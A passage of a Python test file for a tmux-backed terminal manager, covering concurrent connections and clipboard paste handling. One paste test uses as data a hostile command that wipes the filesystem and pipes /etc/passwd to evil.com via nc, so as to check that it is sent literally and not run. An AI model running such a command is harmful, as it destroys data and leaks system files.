        """Concurrent operations from multiple connections."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")

        with patch("ras.terminal.manager.OutputCapture") as mock_capture_class:
            mock_capture = AsyncMock()
            mock_capture.start = AsyncMock()
            mock_capture_class.return_value = mock_capture

            # Multiple connections attach
            for i in range(5):
                await manager.handle_command(
                    f"conn{i}",
                    TerminalCommand(
                        attach=AttachTerminal(
                            session_id="abc123def456", from_sequence=0
                        )
                    ),
                )

            assert manager.get_attachment_count("abc123def456") == 5
            event_collector.clear()

            # All send input concurrently (simulated sequentially here)
            for i in range(5):
                await manager.handle_command(
                    f"conn{i}",
                    TerminalCommand(
                        input=TerminalInput(
                            session_id="abc123def456", data=f"msg{i}".encode()
                        )
                    ),
                )

            # All inputs sent to tmux
            assert len(mock_tmux_executor.sent_keys) == 5

            # Output broadcast to all
            manager._on_output("abc123def456", b"response")
            output = event_collector.get_output_events()
            assert len(output) == 5  # All 5 connections receive it


# =============================================================================
# E2E CLIPBOARD PASTE TESTS
# =============================================================================


class TestE2EClipboardPaste:
    """E2E tests for clipboard paste functionality.

    These tests verify that pasted content (via TerminalInput.data) is
    correctly sent to tmux exactly as received, without interpretation.
    """

    @pytest.mark.asyncio
    async def test_paste_simple_text(
        self, manager, mock_session_provider, mock_tmux_executor
    ):
        """Simple text paste is sent to tmux."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")
        manager._attachments["abc123def456"] = {"conn1"}

        command = TerminalCommand(
            input=TerminalInput(session_id="abc123def456", data=b"hello world")
        )
        await manager.handle_command("conn1", command)

        assert len(mock_tmux_executor.sent_keys) == 1
        assert mock_tmux_executor.sent_keys[0][1] == b"hello world"
        assert mock_tmux_executor.sent_keys[0][2] is True  # literal

    @pytest.mark.asyncio
    async def test_paste_unicode_content(
        self, manager, mock_session_provider, mock_tmux_executor
    ):
        """Unicode paste (CJK, emoji) is sent as UTF-8 bytes."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")
        manager._attachments["abc123def456"] = {"conn1"}

        # CJK text
        cjk_bytes = "Hello 世界".encode("utf-8")
        command = TerminalCommand(
            input=TerminalInput(session_id="abc123def456", data=cjk_bytes)
        )
        await manager.handle_command("conn1", command)

        assert mock_tmux_executor.sent_keys[-1][1] == cjk_bytes

        # Emoji
        emoji_bytes = "🎉🚀💻".encode("utf-8")
        command = TerminalCommand(
            input=TerminalInput(session_id="abc123def456", data=emoji_bytes)
        )
        await manager.handle_command("conn1", command)

        assert mock_tmux_executor.sent_keys[-1][1] == emoji_bytes

    @pytest.mark.asyncio
    async def test_paste_multiline_content(
        self, manager, mock_session_provider, mock_tmux_executor
    ):
        """Multiline paste preserves all line endings."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")
        manager._attachments["abc123def456"] = {"conn1"}

        # LF line endings
        lf_content = b"line1\nline2\nline3"
        command = TerminalCommand(
            input=TerminalInput(session_id="abc123def456", data=lf_content)
        )
        await manager.handle_command("conn1", command)
        assert mock_tmux_executor.sent_keys[-1][1] == lf_content

        # CRLF line endings
        crlf_content = b"line1\r\nline2\r\nline3"
        command = TerminalCommand(
            input=TerminalInput(session_id="abc123def456", data=crlf_content)
        )
        await manager.handle_command("conn1", command)
        assert mock_tmux_executor.sent_keys[-1][1] == crlf_content

    @pytest.mark.asyncio
    async def test_paste_shell_metacharacters_sent_literally(
        self, manager, mock_session_provider, mock_tmux_executor
    ):
        """Shell metacharacters in paste are sent literally, not executed."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")
        manager._attachments["abc123def456"] = {"conn1"}

        # Dangerous-looking content that should be sent literally
        dangerous_content = b"; rm -rf / && cat /etc/passwd | nc evil.com 1234"
        command = TerminalCommand(
            input=TerminalInput(session_id="abc123def456", data=dangerous_content)
        )
        await manager.handle_command("conn1", command)

        # Sent exactly as-is with literal=True
        assert mock_tmux_executor.sent_keys[-1][1] == dangerous_content
        assert mock_tmux_executor.sent_keys[-1][2] is True

    @pytest.mark.asyncio
    async def test_paste_at_max_size(
        self, manager, mock_session_provider, mock_tmux_executor
    ):
        """Paste at exactly 64KB limit succeeds."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")
        manager._attachments["abc123def456"] = {"conn1"}

        # Exactly 64KB
        max_content = b"x" * 65536
        command = TerminalCommand(
            input=TerminalInput(session_id="abc123def456", data=max_content)
        )
        await manager.handle_command("conn1", command)

        assert len(mock_tmux_executor.sent_keys) == 1
        assert len(mock_tmux_executor.sent_keys[0][1]) == 65536

    @pytest.mark.asyncio
    async def test_paste_over_max_size_rejected(
        self, manager, mock_session_provider, mock_tmux_executor, event_collector
    ):
        """Paste over 64KB limit is rejected."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")
        manager._attachments["abc123def456"] = {"conn1"}

        # Over 64KB (client should truncate, but daemon validates too)
        oversized = b"x" * 100000
        command = TerminalCommand(
            input=TerminalInput(session_id="abc123def456", data=oversized)
        )
        await manager.handle_command("conn1", command)

        # Should be rejected
        errors = event_collector.get_error_events()
        assert len(errors) == 1
        assert errors[0][1].error.error_code == "INPUT_TOO_LARGE"
        assert len(mock_tmux_executor.sent_keys) == 0

    @pytest.mark.asyncio
    async def test_paste_control_characters(
        self, manager, mock_session_provider, mock_tmux_executor
    ):
        """Control characters in paste are sent as-is."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")
        manager._attachments["abc123def456"] = {"conn1"}

        # Content with control characters
        control_content = b"hello\x07world\x1b[31mred\x1b[0m"
        command = TerminalCommand(
            input=TerminalInput(session_id="abc123def456", data=control_content)
        )
        await manager.handle_command("conn1", command)

        assert mock_tmux_executor.sent_keys[-1][1] == control_content

    @pytest.mark.asyncio
    async def test_paste_empty_is_noop(
        self, manager, mock_session_provider, mock_tmux_executor
    ):
        """Empty paste is a no-op (handled client-side, but daemon accepts)."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")
        manager._attachments["abc123def456"] = {"conn1"}

        command = TerminalCommand(
            input=TerminalInput(session_id="abc123def456", data=b"")
        )
        await manager.handle_command("conn1", command)

        # Empty input is sent (daemon doesn't filter, client should)
        # The daemon sends empty data to tmux send-keys -l ""
        assert len(mock_tmux_executor.sent_keys) == 1
        assert mock_tmux_executor.sent_keys[0][1] == b""

    @pytest.mark.asyncio
    async def test_paste_rapid_succession(
        self, manager, mock_session_provider, mock_tmux_executor
    ):
        """Multiple rapid pastes are all delivered in order."""
        mock_session_provider.add_session("abc123def456", "ras-test-session")
        manager._attachments["abc123def456"] = {"conn1"}

        # 10 rapid pastes
        for i in range(10):
            command = TerminalCommand(
                input=TerminalInput(
                    session_id="abc123def456", data=f"paste{i}".encode()
                )
            )
            await manager.handle_command("conn1", command)

        # All 10 delivered in order
        assert len(mock_tmux_executor.sent_keys) == 10
        for i, (_, data, _) in enumerate(mock_tmux_executor.sent_keys):
            assert data == f"paste{i}".encode()
